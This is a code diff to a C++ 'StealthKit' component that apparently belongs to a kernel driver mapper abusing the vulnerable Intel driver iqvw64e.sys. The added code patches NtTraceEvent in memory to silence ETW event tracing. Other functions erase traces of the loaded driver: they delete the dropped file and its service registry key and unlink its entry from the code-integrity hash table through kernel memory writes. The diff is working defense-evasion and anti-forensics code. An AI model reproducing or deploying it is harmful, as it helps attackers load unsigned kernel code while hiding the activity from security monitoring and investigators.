@@ -4,35 +4,37 @@
 
 
 
-BOOLEAN StealthKit::DeleteDriverFiles(const std::wstring& serviceName)
+
+BOOLEAN StealthKit::DeleteDriverFile(const std::wstring& serviceName)
 {
-    wchar_t path[MAX_PATH];
-    if (!GetSystemDirectoryW(path, MAX_PATH)) return false;
+    WCHAR tempPath[MAX_PATH];
+    GetTempPathW(MAX_PATH, tempPath);
+    std::wstring driverPath = std::wstring(tempPath) + L"iqvw64e.sys";
 
-    std::wstring driverPath = std::wstring(path) + L"\\drivers\\" + serviceName + L".sys";
-
-    if (!MoveFileExW(driverPath.c_str(), nullptr, MOVEFILE_DELAY_UNTIL_REBOOT)) 
+    if (DeleteFileW(driverPath.c_str()))
     {
-        std::wcout << L"[!] MoveFileEx failed " << GetLastError() << L'\n';
-        return false;
+        LOG_SUCCESS("Driver file deleted successfully.");
+        return TRUE;
     }
-
-    std::wcout << L"[+] Driver file queued for delete on reboot\n";
-    return true;
+    else
+    {
+        LOG_ERROR("Failed to delete Intel driver file. Status code : " << GetLastError());
+        return FALSE;
+    }
 }
 
-BOOLEAN StealthKit::EraseServiceKey(const std::wstring& serviceName)
+BOOLEAN StealthKit::DeleteRegistryKeys(const std::wstring& serviceName)
 {
     const std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + serviceName;
 
     LSTATUS st = RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath.c_str());
     if (st != ERROR_SUCCESS && st != ERROR_FILE_NOT_FOUND)
     {
-        std::wcout << L"[!] RegDeleteTree failed " << st << L'\n';
+        LOG_ERROR_HEX("Failed to delete registry key. Status code : ", st);
         return false;
     }
 
-    std::wcout << L"[+] Service registry key erased\n";
+    LOG_SUCCESS("Registry key successfully deleted.");
     return true;
 }
 
@@ -46,9 +48,7 @@ BOOLEAN StealthKit::RewriteKernelCode(uint64_t base, uint32_t size)
     X64Assembler a;
 
     a.SaveNonVolatileRegisters();
-    a.SubRspImm8(0x20);
     a.XorRaxRax();
-    a.AddRspImm8(0x20);
     a.RestoreNonVolatileRegisters();
     a.Ret();
 
@@ -92,6 +92,11 @@ BOOLEAN StealthKit::RewriteKernelCode(uint64_t base, uint32_t size)
     return TRUE;
 }
 
+
+ValkStatus StealthKit::PatchETW()
+{
+    return ValkStatus();
+}
 
 BOOLEAN StealthKit::ClearMmUnloadedDrivers()
 {
@@ -399,6 +404,65 @@ void StealthKit::EnumeratePiDDBCache()
     LOG_SUCCESS("End of enumeration.");
 }
 
+VOID StealthKit::DebugEtwHooks()
+{
+    PVOID pFunc = GetNtdllFuncPtr("NtTraceEvent");
+
+    using NtTraceEventFn = NTSTATUS(NTAPI*)(HANDLE, ULONG, ULONG, PVOID);
+    auto fn = (NtTraceEventFn)pFunc;
+
+    NTSTATUS status = fn(nullptr, 0, 0, nullptr);
+    if (status == 0xDEADC0DE)
+    {
+        LOG_SUCCESS("NtTraceEvent hook confirmed -> returns 0xDEADC0DE");
+    }
+    else
+    {
+        LOG_ERROR_HEX("NtTraceEvent hook failed -> returned", status);
+    }
+}
+
+BOOLEAN StealthKit::PatchNtTraceEvent()
+{
+    PVOID pFunc = GetNtdllFuncPtr("NtTraceEvent");
+    if (!pFunc)
+    {
+        LOG_ERROR("Failed to resolve NtTraceEvent");
+        return FALSE;
+    }
+
+    uint8_t original[16] = { 0 };
+    SIZE_T read = 0;
+    if (!ReadProcessMemory(GetCurrentProcess(), pFunc, original, sizeof(original), &read) || read != sizeof(original))
+    {
+        LOG_ERROR("Failed to read NtTraceEvent memory");
+        return FALSE;
+    }
+    DumpBytes("NtTraceEvent original", original, 16);
+
+    X64Assembler a;
+    auto patch = a.CreateImmediateReturn(0xDEADC0DE);
+    DumpBytes("NtTraceEvent patch", const_cast<uint8_t*>(patch.data()), patch.size());
+
+    DWORD oldProtect = 0;
+    if (!VirtualProtect(pFunc, patch.size(), PAGE_EXECUTE_READWRITE, &oldProtect))
+    {
+        LOG_ERROR("Failed to change memory protection");
+        return FALSE;
+    }
+
+    memcpy(pFunc, patch.data(), patch.size());
+
+    if (!VirtualProtect(pFunc, patch.size(), oldProtect, &oldProtect))
+    {
+        LOG_ERROR("Failed to restore memory protection");
+        return FALSE;
+    }
+
+    LOG_SUCCESS("NtTraceEvent patched -> ETW muted");
+    return TRUE;
+}
+
 
 
 // -----------------------------------------------------------------------
@@ -419,27 +483,16 @@ ValkStatus StealthKit::ClearCIHashTable()
 {
     constexpr ULONG MAX_NAME_LEN = 256;
 
-    UINT64 ciBase = PEUtils::GetModuleBaseAddress("ci.dll");
-    if (!ciBase)
-        return ValkStatus::ERR_MODULE_NOT_FOUND;
+    UINT64 g_BucketList = m_offsets.CiBucketList;
+    PVOID g_Lock = (PVOID)m_offsets.CiBucketLock;
 
-    auto sig = m_loader.FindPatternInSectionAtKernel("PAGE", ciBase,
-        PUCHAR("\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00"),
-        "xxx????x?xxxxxxx");
-    if (!sig)
-        return ValkStatus::ERR_PATTERN_NOT_FOUND;
-
-    auto sig2 = m_loader.FindPatternAtKernel((uintptr_t)sig - 50, 50, PUCHAR("\x48\x8D\x0D"), "xxx");
-    if (!sig2)
-        return ValkStatus::ERR_PATTERN_NOT_FOUND;
-
-    const auto g_BucketList = m_loader.ResolveRelativeAddress((PVOID)sig, 3, 7);
-    const auto g_Lock = m_loader.ResolveRelativeAddress((PVOID)sig2, 3, 7);
     if (!g_BucketList || !g_Lock)
         return ValkStatus::ERR_RESOLVE_FAILED;
 
     LOG_SUCCESS_HEX("BucketList", g_BucketList);
     LOG_SUCCESS_HEX("Lock", g_Lock);
+    LOG_SUCCESS_HEX("TEST BUCKET : ", m_offsets.CiBucketList);
+    LOG_SUCCESS_HEX("TEST LOCK : ", m_offsets.CiBucketLock);
 
     if (!m_loader.ExAcquireResourceExclusiveLite(g_Lock, true))
         return ValkStatus::ERR_LOCK_FAILED;
@@ -448,10 +501,6 @@ ValkStatus StealthKit::ClearCIHashTable()
     const std::wstring targetPath = m_loader.GetDriverPath();  // "C:\Users\...\Temp\iqvw64e.sys"
 
     const size_t targetBytes = (targetPath.length() - 2) * sizeof(wchar_t);
-
-    //LOG_SUCCESS(L"Target name: " + targetName);
-    //LOG_SUCCESS(L"Target path: " + targetPath);
-    //LOG_SUCCESS_HEX("Target bytes", targetBytes);
 
     uintptr_t prev = (uintptr_t)g_BucketList;
     uintptr_t curr = 0;
@@ -474,7 +523,6 @@ ValkStatus StealthKit::ClearCIHashTable()
 
     while (curr)
     {
-       // LOG_SUCCESS_HEX("scanning entry", curr);
 
         USHORT len = 0;
         if (!m_loader.ReadMemory(curr + offsetof(HashBucketEntry, DriverName.Length), &len, sizeof(len)))
@@ -482,7 +530,6 @@ ValkStatus StealthKit::ClearCIHashTable()
             LOG_ERROR("failed to read Length");
             break;
         }
-       // LOG_SUCCESS_HEX("Length", len);
 
         uintptr_t bufferAddr = 0;
         if (!m_loader.ReadMemory(curr + offsetof(HashBucketEntry, DriverName.Buffer), &bufferAddr, sizeof(bufferAddr)))
@@ -502,8 +549,6 @@ ValkStatus StealthKit::ClearCIHashTable()
                 name[charCount] = L'\0';
                 std::wstring_view sv(name.get(), charCount);
 
-             //   LOG_SUCCESS(L"name: " + std::wstring(sv));
-
                 if (len == targetBytes)
                 {
 
@@ -517,7 +562,6 @@ ValkStatus StealthKit::ClearCIHashTable()
                             LOG_ERROR("failed to read Next");
                             break;
                         }
-                       // LOG_SUCCESS_HEX("Next entry", next);
 
                         if (!m_loader.WriteMemory(prev, &next, sizeof(next)))
                         {
@@ -537,7 +581,7 @@ ValkStatus StealthKit::ClearCIHashTable()
                     }
                     else
                     {
-                        LOG_SUCCESS("Length matches but name doesn't");
+                        LOG_WARNING("Length matches but name doesn't");
                     }
                 }
             }
@@ -567,7 +611,7 @@ ValkStatus StealthKit::ClearCIHashTable()
         }
     }
 
-    LOG_SUCCESS("No more entries – driver not found in CI list");
+    LOG_WARNING("No more entries – driver not found in CI list");
     m_loader.ExReleaseResourceLite(g_Lock);
     return ValkStatus::ERR_NOT_FOUND;
 }
